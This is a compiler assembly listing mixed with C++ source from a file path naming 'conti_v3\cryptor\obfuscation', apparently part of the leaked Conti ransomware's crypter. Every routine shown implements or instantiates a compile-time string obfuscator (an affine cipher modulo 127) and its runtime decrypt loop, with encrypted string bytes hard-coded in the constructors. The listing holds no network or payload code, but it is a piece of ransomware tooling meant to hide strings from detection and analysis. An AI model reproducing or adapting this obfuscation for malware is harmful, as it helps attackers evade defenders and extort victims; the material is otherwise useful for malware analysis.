; 56   :     inline bool isDecrypted() const
; 57   :     {
; 58   :         return m_isDecrypted;
; 59   :     }
; 60   : 
; 61   :     inline const char* decrypt()
; 62   :     {
; 63   :         if (!isDecrypted())
; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)
; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);
; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }
; 71   : 
; 72   : private:
; 73   :     constexpr unsigned char __forceinline encrypt(unsigned char byte) const
; 74   :     {
; 75   :         return (A * byte + B) % 127;
; 76   :     }
; 77   : 
; 78   :     constexpr unsigned char __forceinline decrypt(unsigned char byte) const
; 79   :     {
; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);
; 81   :     }
; 82   : 
; 83   :     volatile bool m_isDecrypted = false;

  00000	c6 01 00	 mov	 BYTE PTR [rcx], 0
  00003	c6 41 01 74	 mov	 BYTE PTR [rcx+1], 116	; 00000074H
  00007	c6 41 02 34	 mov	 BYTE PTR [rcx+2], 52	; 00000034H
  0000b	c6 41 03 55	 mov	 BYTE PTR [rcx+3], 85	; 00000055H
  0000f	c6 41 04 34	 mov	 BYTE PTR [rcx+4], 52	; 00000034H
  00013	c6 41 05 1b	 mov	 BYTE PTR [rcx+5], 27
  00017	c6 41 06 34	 mov	 BYTE PTR [rcx+6], 52	; 00000034H
  0001b	c6 41 07 09	 mov	 BYTE PTR [rcx+7], 9
  0001f	c6 41 08 34	 mov	 BYTE PTR [rcx+8], 52	; 00000034H
  00023	c6 41 09 31	 mov	 BYTE PTR [rcx+9], 49	; 00000031H
  00027	c6 41 0a 34	 mov	 BYTE PTR [rcx+10], 52	; 00000034H
  0002b	c6 41 0b 72	 mov	 BYTE PTR [rcx+11], 114	; 00000072H
  0002f	c6 41 0c 34	 mov	 BYTE PTR [rcx+12], 52	; 00000034H
  00033	c6 41 0d 3c	 mov	 BYTE PTR [rcx+13], 60	; 0000003cH
  00037	c6 41 0e 34	 mov	 BYTE PTR [rcx+14], 52	; 00000034H
  0003b	c6 41 0f 07	 mov	 BYTE PTR [rcx+15], 7
  0003f	c6 41 10 34	 mov	 BYTE PTR [rcx+16], 52	; 00000034H
  00043	c6 41 11 34	 mov	 BYTE PTR [rcx+17], 52	; 00000034H
  00047	c6 41 12 34	 mov	 BYTE PTR [rcx+18], 52	; 00000034H
  0004b	0f b6 41 01	 movzx	 eax, BYTE PTR [rcx+1]
  0004f	48 8b c1	 mov	 rax, rcx
  00052	c3		 ret	 0
??0?$MetaBuffer@$0BN@$0DE@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@@std@@@@QEAA@PEBE@Z ENDP ; MetaBuffer<29,52,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17> >::MetaBuffer<29,52,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17> >
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0BP@$0GD@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@@std@@@@QEAAPEBDXZ
_TEXT	SEGMENT
this$ = 8
?decrypt@?$MetaBuffer@$0BP@$0GD@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@@std@@@@QEAAPEBDXZ PROC ; MetaBuffer<31,99,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15> >::decrypt, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]
  00003	4c 8d 49 01	 lea	 r9, QWORD PTR [rcx+1]

; 63   :         if (!isDecrypted())

  00007	84 c0		 test	 al, al
  00009	75 68		 jne	 SHORT $LN17@decrypt

; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)

  0000b	4d 8b d1	 mov	 r10, r9
  0000e	41 bb 10 00 00
	00		 mov	 r11d, 16
  00014	0f 1f 40 00 0f
	1f 84 00 00 00
	00 00		 npad	 12
$LL4@decrypt:

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00020	41 0f b6 0a	 movzx	 ecx, BYTE PTR [r10]
  00024	4d 8d 52 01	 lea	 r10, QWORD PTR [r10+1]

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00028	83 e9 63	 sub	 ecx, 99			; 00000063H

; 40   :     return (a % n + n) % n;

  0002b	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00030	44 6b c1 29	 imul	 r8d, ecx, 41		; 00000029H

; 40   :     return (a % n + n) % n;

  00034	41 f7 e8	 imul	 r8d
  00037	41 03 d0	 add	 edx, r8d
  0003a	c1 fa 06	 sar	 edx, 6
  0003d	8b c2		 mov	 eax, edx
  0003f	c1 e8 1f	 shr	 eax, 31
  00042	03 d0		 add	 edx, eax
  00044	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00047	44 2b c0	 sub	 r8d, eax
  0004a	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  0004f	41 83 c0 7f	 add	 r8d, 127		; 0000007fH
  00053	41 f7 e8	 imul	 r8d
  00056	41 03 d0	 add	 edx, r8d
  00059	c1 fa 06	 sar	 edx, 6
  0005c	8b c2		 mov	 eax, edx
  0005e	c1 e8 1f	 shr	 eax, 31
  00061	03 d0		 add	 edx, eax
  00063	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00066	44 2b c0	 sub	 r8d, eax

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00069	45 88 42 ff	 mov	 BYTE PTR [r10-1], r8b
  0006d	49 83 eb 01	 sub	 r11, 1
  00071	75 ad		 jne	 SHORT $LL4@decrypt
$LN17@decrypt:

; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }

  00073	49 8b c1	 mov	 rax, r9
  00076	c3		 ret	 0
?decrypt@?$MetaBuffer@$0BP@$0GD@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@@std@@@@QEAAPEBDXZ ENDP ; MetaBuffer<31,99,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ??0?$MetaBuffer@$0BP@$0GD@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@@std@@@@QEAA@PEBE@Z
_TEXT	SEGMENT
this$ = 8
data$dead$ = 16
??0?$MetaBuffer@$0BP@$0GD@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@@std@@@@QEAA@PEBE@Z PROC ; MetaBuffer<31,99,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15> >::MetaBuffer<31,99,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15> >, COMDAT

; 55   : 
; 56   :     inline bool isDecrypted() const
; 57   :     {
; 58   :         return m_isDecrypted;
; 59   :     }
; 60   : 
; 61   :     inline const char* decrypt()
; 62   :     {
; 63   :         if (!isDecrypted())
; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)
; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);
; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }
; 71   : 
; 72   : private:
; 73   :     constexpr unsigned char __forceinline encrypt(unsigned char byte) const
; 74   :     {
; 75   :         return (A * byte + B) % 127;
; 76   :     }
; 77   : 
; 78   :     constexpr unsigned char __forceinline decrypt(unsigned char byte) const
; 79   :     {
; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);
; 81   :     }
; 82   : 
; 83   :     volatile bool m_isDecrypted = false;

  00000	c6 01 00	 mov	 BYTE PTR [rcx], 0
  00003	c6 41 01 01	 mov	 BYTE PTR [rcx+1], 1
  00007	c6 41 02 63	 mov	 BYTE PTR [rcx+2], 99	; 00000063H
  0000b	c6 41 03 6c	 mov	 BYTE PTR [rcx+3], 108	; 0000006cH
  0000f	c6 41 04 63	 mov	 BYTE PTR [rcx+4], 99	; 00000063H
  00013	c6 41 05 2e	 mov	 BYTE PTR [rcx+5], 46	; 0000002eH
  00017	c6 41 06 63	 mov	 BYTE PTR [rcx+6], 99	; 00000063H
  0001b	c6 41 07 12	 mov	 BYTE PTR [rcx+7], 18
  0001f	c6 41 08 63	 mov	 BYTE PTR [rcx+8], 99	; 00000063H
  00023	c6 41 09 34	 mov	 BYTE PTR [rcx+9], 52	; 00000034H
  00027	c6 41 0a 63	 mov	 BYTE PTR [rcx+10], 99	; 00000063H
  0002b	c6 41 0b 0c	 mov	 BYTE PTR [rcx+11], 12
  0002f	c6 41 0c 63	 mov	 BYTE PTR [rcx+12], 99	; 00000063H
  00033	c6 41 0d 37	 mov	 BYTE PTR [rcx+13], 55	; 00000037H
  00037	c6 41 0e 63	 mov	 BYTE PTR [rcx+14], 99	; 00000063H
  0003b	c6 41 0f 63	 mov	 BYTE PTR [rcx+15], 99	; 00000063H
  0003f	c6 41 10 63	 mov	 BYTE PTR [rcx+16], 99	; 00000063H
  00043	0f b6 41 01	 movzx	 eax, BYTE PTR [rcx+1]
  00047	48 8b c1	 mov	 rax, rcx
  0004a	c3		 ret	 0
??0?$MetaBuffer@$0BP@$0GD@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@@std@@@@QEAA@PEBE@Z ENDP ; MetaBuffer<31,99,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15> >::MetaBuffer<31,99,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15> >
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$06$0DA@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ
_TEXT	SEGMENT
this$ = 8
?decrypt@?$MetaBuffer@$06$0DA@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ PROC ; MetaBuffer<7,48,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]
  00003	4c 8d 41 01	 lea	 r8, QWORD PTR [rcx+1]

; 63   :         if (!isDecrypted())

  00007	84 c0		 test	 al, al
  00009	75 66		 jne	 SHORT $LN17@decrypt

; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)

  0000b	4d 8b c8	 mov	 r9, r8
  0000e	41 ba 0a 00 00
	00		 mov	 r10d, 10
  00014	0f 1f 40 00 0f
	1f 84 00 00 00
	00 00		 npad	 12
$LL4@decrypt:

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00020	41 0f b6 09	 movzx	 ecx, BYTE PTR [r9]
  00024	4d 8d 49 01	 lea	 r9, QWORD PTR [r9+1]

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00028	b8 30 00 00 00	 mov	 eax, 48			; 00000030H
  0002d	2b c1		 sub	 eax, ecx
  0002f	8d 0c c0	 lea	 ecx, DWORD PTR [rax+rax*8]

; 40   :     return (a % n + n) % n;

  00032	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00037	03 c9		 add	 ecx, ecx

; 40   :     return (a % n + n) % n;

  00039	f7 e9		 imul	 ecx
  0003b	03 d1		 add	 edx, ecx
  0003d	c1 fa 06	 sar	 edx, 6
  00040	8b c2		 mov	 eax, edx
  00042	c1 e8 1f	 shr	 eax, 31
  00045	03 d0		 add	 edx, eax
  00047	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  0004a	2b c8		 sub	 ecx, eax
  0004c	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  00051	83 c1 7f	 add	 ecx, 127		; 0000007fH
  00054	f7 e9		 imul	 ecx
  00056	03 d1		 add	 edx, ecx
  00058	c1 fa 06	 sar	 edx, 6
  0005b	8b c2		 mov	 eax, edx
  0005d	c1 e8 1f	 shr	 eax, 31
  00060	03 d0		 add	 edx, eax
  00062	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00065	2b c8		 sub	 ecx, eax

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00067	41 88 49 ff	 mov	 BYTE PTR [r9-1], cl
  0006b	49 83 ea 01	 sub	 r10, 1
  0006f	75 af		 jne	 SHORT $LL4@decrypt
$LN17@decrypt:

; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }

  00071	49 8b c0	 mov	 rax, r8
  00074	c3		 ret	 0
?decrypt@?$MetaBuffer@$06$0DA@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ ENDP ; MetaBuffer<7,48,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ??0?$MetaBuffer@$06$0DA@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAA@PEBE@Z
_TEXT	SEGMENT
this$ = 8
data$dead$ = 16
??0?$MetaBuffer@$06$0DA@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAA@PEBE@Z PROC ; MetaBuffer<7,48,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::MetaBuffer<7,48,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >, COMDAT

; 55   : 
; 56   :     inline bool isDecrypted() const
; 57   :     {
; 58   :         return m_isDecrypted;
; 59   :     }
; 60   : 
; 61   :     inline const char* decrypt()
; 62   :     {
; 63   :         if (!isDecrypted())
; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)
; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);
; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }
; 71   : 
; 72   : private:
; 73   :     constexpr unsigned char __forceinline encrypt(unsigned char byte) const
; 74   :     {
; 75   :         return (A * byte + B) % 127;
; 76   :     }
; 77   : 
; 78   :     constexpr unsigned char __forceinline decrypt(unsigned char byte) const
; 79   :     {
; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);
; 81   :     }
; 82   : 
; 83   :     volatile bool m_isDecrypted = false;

  00000	c6 01 00	 mov	 BYTE PTR [rcx], 0
  00003	c6 41 01 74	 mov	 BYTE PTR [rcx+1], 116	; 00000074H
  00007	c6 41 02 30	 mov	 BYTE PTR [rcx+2], 48	; 00000030H
  0000b	c6 41 03 5b	 mov	 BYTE PTR [rcx+3], 91	; 0000005bH
  0000f	c6 41 04 30	 mov	 BYTE PTR [rcx+4], 48	; 00000030H
  00013	c6 41 05 4d	 mov	 BYTE PTR [rcx+5], 77	; 0000004dH
  00017	c6 41 06 30	 mov	 BYTE PTR [rcx+6], 48	; 00000030H
  0001b	c6 41 07 2a	 mov	 BYTE PTR [rcx+7], 42	; 0000002aH
  0001f	c6 41 08 30	 mov	 BYTE PTR [rcx+8], 48	; 00000030H
  00023	c6 41 09 30	 mov	 BYTE PTR [rcx+9], 48	; 00000030H
  00027	c6 41 0a 30	 mov	 BYTE PTR [rcx+10], 48	; 00000030H
  0002b	0f b6 41 01	 movzx	 eax, BYTE PTR [rcx+1]
  0002f	48 8b c1	 mov	 rax, rcx
  00032	c3		 ret	 0
??0?$MetaBuffer@$06$0DA@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAA@PEBE@Z ENDP ; MetaBuffer<7,48,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::MetaBuffer<7,48,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0GB@$0GN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ
_TEXT	SEGMENT
this$ = 8
?decrypt@?$MetaBuffer@$0GB@$0GN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ PROC ; MetaBuffer<97,109,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]
  00003	4c 8d 49 01	 lea	 r9, QWORD PTR [rcx+1]

; 63   :         if (!isDecrypted())

  00007	84 c0		 test	 al, al
  00009	75 68		 jne	 SHORT $LN17@decrypt

; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)

  0000b	4d 8b d1	 mov	 r10, r9
  0000e	41 bb 0a 00 00
	00		 mov	 r11d, 10
  00014	0f 1f 40 00 0f
	1f 84 00 00 00
	00 00		 npad	 12
$LL4@decrypt:

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00020	41 0f b6 0a	 movzx	 ecx, BYTE PTR [r10]
  00024	4d 8d 52 01	 lea	 r10, QWORD PTR [r10+1]

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00028	83 e9 6d	 sub	 ecx, 109		; 0000006dH

; 40   :     return (a % n + n) % n;

  0002b	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00030	44 6b c1 37	 imul	 r8d, ecx, 55		; 00000037H

; 40   :     return (a % n + n) % n;

  00034	41 f7 e8	 imul	 r8d
  00037	41 03 d0	 add	 edx, r8d
  0003a	c1 fa 06	 sar	 edx, 6
  0003d	8b c2		 mov	 eax, edx
  0003f	c1 e8 1f	 shr	 eax, 31
  00042	03 d0		 add	 edx, eax
  00044	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00047	44 2b c0	 sub	 r8d, eax
  0004a	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  0004f	41 83 c0 7f	 add	 r8d, 127		; 0000007fH
  00053	41 f7 e8	 imul	 r8d
  00056	41 03 d0	 add	 edx, r8d
  00059	c1 fa 06	 sar	 edx, 6
  0005c	8b c2		 mov	 eax, edx
  0005e	c1 e8 1f	 shr	 eax, 31
  00061	03 d0		 add	 edx, eax
  00063	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00066	44 2b c0	 sub	 r8d, eax

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00069	45 88 42 ff	 mov	 BYTE PTR [r10-1], r8b
  0006d	49 83 eb 01	 sub	 r11, 1
  00071	75 ad		 jne	 SHORT $LL4@decrypt
$LN17@decrypt:

; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }

  00073	49 8b c1	 mov	 rax, r9
  00076	c3		 ret	 0
?decrypt@?$MetaBuffer@$0GB@$0GN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ ENDP ; MetaBuffer<97,109,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ??0?$MetaBuffer@$0GB@$0GN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAA@PEBE@Z
_TEXT	SEGMENT
this$ = 8
data$dead$ = 16
??0?$MetaBuffer@$0GB@$0GN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAA@PEBE@Z PROC ; MetaBuffer<97,109,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::MetaBuffer<97,109,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >, COMDAT

; 55   : 
; 56   :     inline bool isDecrypted() const
; 57   :     {
; 58   :         return m_isDecrypted;
; 59   :     }
; 60   : 
; 61   :     inline const char* decrypt()
; 62   :     {
; 63   :         if (!isDecrypted())
; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)
; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);
; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }
; 71   : 
; 72   : private:
; 73   :     constexpr unsigned char __forceinline encrypt(unsigned char byte) const
; 74   :     {
; 75   :         return (A * byte + B) % 127;
; 76   :     }
; 77   : 
; 78   :     constexpr unsigned char __forceinline decrypt(unsigned char byte) const
; 79   :     {
; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);
; 81   :     }
; 82   : 
; 83   :     volatile bool m_isDecrypted = false;

  00000	c6 01 00	 mov	 BYTE PTR [rcx], 0
  00003	c6 41 01 7e	 mov	 BYTE PTR [rcx+1], 126	; 0000007eH
  00007	c6 41 02 6d	 mov	 BYTE PTR [rcx+2], 109	; 0000006dH
  0000b	c6 41 03 58	 mov	 BYTE PTR [rcx+3], 88	; 00000058H
  0000f	c6 41 04 6d	 mov	 BYTE PTR [rcx+4], 109	; 0000006dH
  00013	c6 41 05 33	 mov	 BYTE PTR [rcx+5], 51	; 00000033H
  00017	c6 41 06 6d	 mov	 BYTE PTR [rcx+6], 109	; 0000006dH
  0001b	c6 41 07 15	 mov	 BYTE PTR [rcx+7], 21
  0001f	c6 41 08 6d	 mov	 BYTE PTR [rcx+8], 109	; 0000006dH
  00023	c6 41 09 6d	 mov	 BYTE PTR [rcx+9], 109	; 0000006dH
  00027	c6 41 0a 6d	 mov	 BYTE PTR [rcx+10], 109	; 0000006dH
  0002b	0f b6 41 01	 movzx	 eax, BYTE PTR [rcx+1]
  0002f	48 8b c1	 mov	 rax, rcx
  00032	c3		 ret	 0
??0?$MetaBuffer@$0GB@$0GN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAA@PEBE@Z ENDP ; MetaBuffer<97,109,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::MetaBuffer<97,109,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0BD@$0HC@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ
_TEXT	SEGMENT
this$ = 8
?decrypt@?$MetaBuffer@$0BD@$0HC@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ PROC ; MetaBuffer<19,114,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]
  00003	4c 8d 41 01	 lea	 r8, QWORD PTR [rcx+1]

; 63   :         if (!isDecrypted())

  00007	84 c0		 test	 al, al
  00009	75 67		 jne	 SHORT $LN17@decrypt

; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)

  0000b	4d 8b c8	 mov	 r9, r8
  0000e	41 ba 0a 00 00
	00		 mov	 r10d, 10
  00014	0f 1f 40 00 0f
	1f 84 00 00 00
	00 00		 npad	 12
$LL4@decrypt:

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00020	41 0f b6 09	 movzx	 ecx, BYTE PTR [r9]
  00024	4d 8d 49 01	 lea	 r9, QWORD PTR [r9+1]

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00028	b8 72 00 00 00	 mov	 eax, 114		; 00000072H
  0002d	2b c1		 sub	 eax, ecx
  0002f	8d 0c 80	 lea	 ecx, DWORD PTR [rax+rax*4]

; 40   :     return (a % n + n) % n;

  00032	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00037	c1 e1 02	 shl	 ecx, 2

; 40   :     return (a % n + n) % n;

  0003a	f7 e9		 imul	 ecx
  0003c	03 d1		 add	 edx, ecx
  0003e	c1 fa 06	 sar	 edx, 6
  00041	8b c2		 mov	 eax, edx
  00043	c1 e8 1f	 shr	 eax, 31
  00046	03 d0		 add	 edx, eax
  00048	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  0004b	2b c8		 sub	 ecx, eax
  0004d	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  00052	83 c1 7f	 add	 ecx, 127		; 0000007fH
  00055	f7 e9		 imul	 ecx
  00057	03 d1		 add	 edx, ecx
  00059	c1 fa 06	 sar	 edx, 6
  0005c	8b c2		 mov	 eax, edx
  0005e	c1 e8 1f	 shr	 eax, 31
  00061	03 d0		 add	 edx, eax
  00063	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00066	2b c8		 sub	 ecx, eax

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00068	41 88 49 ff	 mov	 BYTE PTR [r9-1], cl
  0006c	49 83 ea 01	 sub	 r10, 1
  00070	75 ae		 jne	 SHORT $LL4@decrypt
$LN17@decrypt:

; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }

  00072	49 8b c0	 mov	 rax, r8
  00075	c3		 ret	 0
?decrypt@?$MetaBuffer@$0BD@$0HC@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ ENDP ; MetaBuffer<19,114,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ??0?$MetaBuffer@$0BD@$0HC@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAA@PEBE@Z
_TEXT	SEGMENT
this$ = 8
data$dead$ = 16
??0?$MetaBuffer@$0BD@$0HC@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAA@PEBE@Z PROC ; MetaBuffer<19,114,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::MetaBuffer<19,114,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >, COMDAT

; 55   : 
; 56   :     inline bool isDecrypted() const
; 57   :     {
; 58   :         return m_isDecrypted;
; 59   :     }
; 60   : 
; 61   :     inline const char* decrypt()
; 62   :     {
; 63   :         if (!isDecrypted())
; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)
; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);
; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }
; 71   : 
; 72   : private:
; 73   :     constexpr unsigned char __forceinline encrypt(unsigned char byte) const
; 74   :     {
; 75   :         return (A * byte + B) % 127;
; 76   :     }
; 77   : 
; 78   :     constexpr unsigned char __forceinline decrypt(unsigned char byte) const
; 79   :     {
; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);
; 81   :     }
; 82   : 
; 83   :     volatile bool m_isDecrypted = false;

  00000	c6 01 00	 mov	 BYTE PTR [rcx], 0
  00003	c6 41 01 63	 mov	 BYTE PTR [rcx+1], 99	; 00000063H
  00007	c6 41 02 72	 mov	 BYTE PTR [rcx+2], 114	; 00000072H
  0000b	c6 41 03 0d	 mov	 BYTE PTR [rcx+3], 13
  0000f	c6 41 04 72	 mov	 BYTE PTR [rcx+4], 114	; 00000072H
  00013	c6 41 05 4d	 mov	 BYTE PTR [rcx+5], 77	; 0000004dH
  00017	c6 41 06 72	 mov	 BYTE PTR [rcx+6], 114	; 00000072H
  0001b	c6 41 07 0d	 mov	 BYTE PTR [rcx+7], 13
  0001f	c6 41 08 72	 mov	 BYTE PTR [rcx+8], 114	; 00000072H
  00023	c6 41 09 72	 mov	 BYTE PTR [rcx+9], 114	; 00000072H
  00027	c6 41 0a 72	 mov	 BYTE PTR [rcx+10], 114	; 00000072H
  0002b	0f b6 41 01	 movzx	 eax, BYTE PTR [rcx+1]
  0002f	48 8b c1	 mov	 rax, rcx
  00032	c3		 ret	 0
